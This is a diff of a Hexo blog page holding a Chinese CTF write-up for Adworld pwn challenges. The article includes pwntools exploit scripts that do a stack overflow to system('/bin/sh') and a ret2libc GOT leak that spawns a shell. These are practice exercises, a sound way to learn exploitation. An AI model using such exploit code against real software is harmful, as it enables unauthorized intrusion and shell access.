@@ -1,92 +1,33 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="zh-Hans">
-<head><meta name="generator" content="Hexo 3.9.0">
+<html lang="zh-CN">
+<head>
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/blog/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/blog/css/main.css">
 
 
+<link rel="stylesheet" href="/blog/lib/font-awesome/css/all.min.css">
 
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/blog/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
 
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/blog/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-
-
-
-<link href="/blog/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/blog/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/blog/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="攻防世界,Adworld,">
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="pwnlevel2IDA分析很明显的溢出，而且还调用了system，看汇编。拿到call_system的地址，然后shift+f12也找到了bin_sh。脚本 12345678910111213from pwn import *r = process(&quot;level2&quot;)#r = remote(&quot;159.138.137.79&quot;, 63180)context(log_level=&quot;debug&quot;, ar">
+  <meta name="description" content="pwnlevel2">
 <meta name="keywords" content="攻防世界,Adworld">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界CTF-WriteUp">
 <meta property="og:url" content="http://yoursite.com/2020/04/25/攻防世界CTF-WriteUp/index.html">
 <meta property="og:site_name" content="Sncker&#39;s blog - qq948375961">
-<meta property="og:description" content="pwnlevel2IDA分析很明显的溢出，而且还调用了system，看汇编。拿到call_system的地址，然后shift+f12也找到了bin_sh。脚本 12345678910111213from pwn import *r = process(&quot;level2&quot;)#r = remote(&quot;159.138.137.79&quot;, 63180)context(log_level=&quot;debug&quot;, ar">
-<meta property="og:locale" content="zh-Hans">
+<meta property="og:description" content="pwnlevel2">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185138.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185155.png">
@@ -110,45 +51,24 @@
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200937.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200957.png">
 <meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425201254.png">
-<meta property="og:updated_time" content="2020-04-26T13:12:25.144Z">
+<meta property="og:updated_time" content="2020-04-30T11:16:24.815Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界CTF-WriteUp">
-<meta name="twitter:description" content="pwnlevel2IDA分析很明显的溢出，而且还调用了system，看汇编。拿到call_system的地址，然后shift+f12也找到了bin_sh。脚本 12345678910111213from pwn import *r = process(&quot;level2&quot;)#r = remote(&quot;159.138.137.79&quot;, 63180)context(log_level=&quot;debug&quot;, ar">
+<meta name="twitter:description" content="pwnlevel2">
 <meta name="twitter:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png">
 
+<link rel="canonical" href="http://yoursite.com/2020/04/25/攻防世界CTF-WriteUp/">
 
 
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/blog/',
-    scheme: 'Gemini',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
   };
 </script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2020/04/25/攻防世界CTF-WriteUp/">
-
-
-
-
 
   <title>攻防世界CTF-WriteUp | Sncker's blog - qq948375961</title>
   
@@ -158,205 +78,159 @@
 
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/blog/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sncker's blog - qq948375961</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
-      
-        <p class="site-subtitle">情绪不稳定，要做就做大事情。</p>
-      
   </div>
 
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+  <div class="site-meta">
+
+    <a href="/blog/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sncker's blog - qq948375961</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">情绪不稳定，要做就做大事情。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
   </div>
 </div>
 
+
+
+
 <nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
+  <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
-          <a href="/blog/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            首页
-          </a>
-        </li>
-      
-        
+
+    <a href="/blog/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
         <li class="menu-item menu-item-categories">
-          <a href="/blog/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
-            
-            分类
-          </a>
-        </li>
-      
-        
+
+    <a href="/blog/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
-          <a href="/blog/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            归档
-          </a>
-        </li>
-      
 
-      
-    </ul>
-  
+    <a href="/blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
-  
+  </li>
+  </ul>
 </nav>
 
 
 
- </div>
+
+</div>
     </header>
 
-    <main id="main" class="main">
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          <div id="content" class="content">
+          
+
+          <div class="content post posts-expand">
             
 
-  <div id="posts" class="posts-expand">
     
-
-  
-
   
   
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2020/04/25/攻防世界CTF-WriteUp/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/25/攻防世界CTF-WriteUp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="SNCKER">
-      <meta itemprop="description" content>
       <meta itemprop="image" content="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640">
+      <meta itemprop="name" content="SNCKER">
+      <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Sncker's blog - qq948375961">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">攻防世界CTF-WriteUp</h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界CTF-WriteUp
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-25T18:44:00+08:00">
-                2020-04-25
-              </time>
-            
+              <span class="post-meta-item-text">发表于</span>
 
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/blog/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/blog/categories/CTF/WriteUp/" itemprop="url" rel="index">
-                    <span itemprop="name">WriteUp</span>
-                  </a>
-                </span>
-
-                
-                
-              
+              <time title="创建时间：2020-04-25 18:44:00" itemprop="dateCreated datePublished" datetime="2020-04-25T18:44:00+08:00">2020-04-25</time>
             </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-30 19:16:24" itemprop="dateModified" datetime="2020-04-30T19:16:24+08:00">2020-04-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/CTF/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
 
           
 
         </div>
       </header>
-    
 
     
     
@@ -364,13 +238,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
-
-      
-        <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png" alt><br>IDA分析<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185138.png" alt><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185155.png" alt><br>很明显的溢出，而且还调用了system，看汇编。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185409.png" alt><br>拿到call_system的地址，然后shift+f12也找到了bin_sh。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185541.png" alt><br>脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"level2"</span>)</span><br><span class="line"><span class="comment">#r = remote("159.138.137.79", 63180)</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">call_system_addr = <span class="number">0x0804845C</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(call_system_addr) + p32(bin_sh_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
+        <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png" alt></p>
 <a id="more"></a>
+<p>IDA分析<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185138.png" alt><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185155.png" alt><br>很明显的溢出，而且还调用了system，看汇编。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185409.png" alt><br>拿到call_system的地址，然后shift+f12也找到了bin_sh。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185541.png" alt><br>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"level2"</span>)</span><br><span class="line"><span class="comment">#r = remote("159.138.137.79", 63180)</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">call_system_addr = <span class="number">0x0804845C</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(call_system_addr) + p32(bin_sh_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185947.png" alt><br>保护全开了，IDA分析。<br>main反汇编  </p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0(v3, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;v8);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -442,258 +313,169 @@
 
 <p>再次跳回vulnerable_function后就是简单的ret2libc了。<br>完整代码  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc_32.so.6"</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"level3"</span>)</span><br><span class="line"></span><br><span class="line">vul_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8C</span> + p32(write_plt) + p32(vul_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendafter(<span class="string">"put:\n"</span>, payload)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">"write_addr: "</span> + str(hex(write_addr)))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8C</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(bin_sh_addr)</span><br><span class="line">r.sendafter(<span class="string">"put:\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-      
     </div>
+
     
     
     
 
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/blog/tags/攻防世界/" rel="tag"># 攻防世界</a>
-          
-            <a href="/blog/tags/Adworld/" rel="tag"># Adworld</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/blog/2020/03/05/BugkuCTF-WriteUp/" rel="next" title="BugkuCTF-WriteUp">
-                <i class="fa fa-chevron-left"></i> BugkuCTF-WriteUp
-              </a>
-            
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/blog/tags/攻防世界/" rel="tag"># 攻防世界</a>
+              <a href="/blog/tags/Adworld/" rel="tag"># Adworld</a>
           </div>
 
-          <span class="post-nav-divider"></span>
+        
 
-          <div class="post-nav-prev post-nav-item">
-            
-          </div>
-        </div>
-      
 
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/blog/2020/03/05/BugkuCTF-WriteUp/" rel="prev" title="BugkuCTF-WriteUp">
+      <i class="fa fa-chevron-left"></i> BugkuCTF-WriteUp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
   </article>
+  
+  
+  
 
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
 
 
           </div>
           
 
-
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640" alt="SNCKER">
-            
-              <p class="site-author-name" itemprop="name">SNCKER</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/blog/archives/">
-              
-                  <span class="site-state-item-count">16</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/blog/categories/index.html">
-                  <span class="site-state-item-count">7</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">5</span>
-                  <span class="site-state-item-name">标签</span>
-                
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.1.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#guess-num"><span class="nav-number">1.2.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#int-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgpwn2"><span class="nav-number">1.4.</span> <span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#when-did-you-born"><span class="nav-number">1.5.</span> <span class="nav-text">when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-pwn"><span class="nav-number">1.6.</span> <span class="nav-text">hello_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">1.7.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.8.</span> <span class="nav-text">level3</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">SNCKER</span>
-
-  
-</div>
-
-
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
